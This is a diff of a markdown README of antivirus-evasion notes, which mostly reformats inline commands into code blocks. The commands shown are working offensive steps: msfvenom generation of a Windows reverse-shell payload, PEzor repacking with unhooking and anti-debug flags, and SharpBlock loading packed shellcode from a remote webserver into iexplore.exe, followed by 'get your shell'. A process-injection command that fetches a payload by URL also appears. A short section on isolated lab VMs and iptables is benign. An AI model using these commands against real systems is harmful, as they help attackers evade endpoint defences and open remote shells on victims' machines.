@@ -23,14 +23,23 @@ Winning combo : SharpBlock + PEzor (bypass Kasp for the moment..)
 
 1. Compile SharpBlock from source (using VStudio). It generates a file : SharpBlock.exe
 2. Generate shellcode in raw format (here is an exemple for msf) : 
-  `msfvenom -p windows/x64/shell_reverse_tcp LHOST=<HANDLER_IP> LHOST=<HANDLER_PORT> -f raw -o <SHELLCODE_NAME>.bin`
+
+  ```sh
+  msfvenom -p windows/x64/shell_reverse_tcp LHOST=<HANDLER_IP> LHOST=<HANDLER_PORT> -f raw -o <SHELLCODE_NAME>.bin
+  ```
 3. Repack shellcode
-  `./PEzor.sh -unhook -antidebug -text -sgn -sleep=150 <SHELLCODE_NAME>.bin`
+  ```sh
+  ./PEzor.sh -unhook -antidebug -text -sgn -sleep=150 <SHELLCODE_NAME>.bin
+  ```
 4. Repack SharpBlock adding arguments
   - HTTP webserver version :
-  `./PEzor.sh -unhook -antidebug -text -rx -sleep=150 <SharpBlock.exe> -p '-e http://<IP_WEBSERVER>/<SHELLCODE_NAME>.bin.packed.exe -s "c:\program files\internet explorer\iexplore.exe"'` 
+  ```sh
+  ./PEzor.sh -unhook -antidebug -text -rx -sleep=150 <SharpBlock.exe> -p '-e http://<IP_WEBSERVER>/<SHELLCODE_NAME>.bin.packed.exe -s "c:\program files\internet explorer\iexplore.exe"'
+  ```
   - Local version :
-  `./PEzor.sh -unhook -antidebug -text -rx -sleep=150 SharpBlock.exe -p '-e <SHELLCODE_NAME>.bin.packed.exe -s "c:\program files\internet explorer\iexplore.exe"'`
+  ```sh
+  ./PEzor.sh -unhook -antidebug -text -rx -sleep=150 SharpBlock.exe -p '-e <SHELLCODE_NAME>.bin.packed.exe -s "c:\program files\internet explorer\iexplore.exe"'
+  ```
 5. Setup your launcher (and webserver), and execute the packed binary file from the target
 6. Be patient (\~5min), get your shell and enjoy
 
@@ -46,7 +55,7 @@ For testing using a Windows VM connecting to an offline C2 :
 1. Create a Windows VM and install the target AV.
 2. Create a Linux VM and install a C2.
 3. Set up the network interface to Host-Only for all VMs (Target(s) and C2).
-4. Test your payloads and enjoy your shells :+1: 
+4. Test your payloads and enjoy your shells :)
 > You may want to use snapshots and/or linked clones after your infrastructure is ready so that you can trash your Windows VM after each test and pop a new one.
 
 ### Online testing 
@@ -97,7 +106,9 @@ To restrict the Windows VM traffic to the C2 server only (we don't want our payl
   sudo iptables -P OUTPUT DROP
   ```
 6. make it persistent at each restart :
-  `sudo apt install iptables-persistent && sudo iptables-save -c > /etc/iptables/rules.v4`
+  ```sh
+  sudo apt install iptables-persistent && sudo iptables-save -c > /etc/iptables/rules.v4
+  ```
 7. Configure the Windows VM (Host-Only network interface) to use the linux VM as his gateway (set static IP address).
 8. For DNS you can add the association into the file : `C:\Windows\System32\drivers\etc\hosts`
 9. Test your payloads and enjoy your shells :+1:
@@ -139,6 +150,8 @@ ProcessInjection.exe /f:raw /url:http://192.168.56.200:9000/longhaul/longhaul_be
 > copy Bin\wraith_x64_encoded.bin \\192.168.56.200\tiki\
 
 ```
+
+---
 
 ## Theorical
 
@@ -217,6 +230,8 @@ Whitelised program :
 - Powershell
 - LOLbins
 - DLL SIdeloading
+
+---
 
 ## Links
 
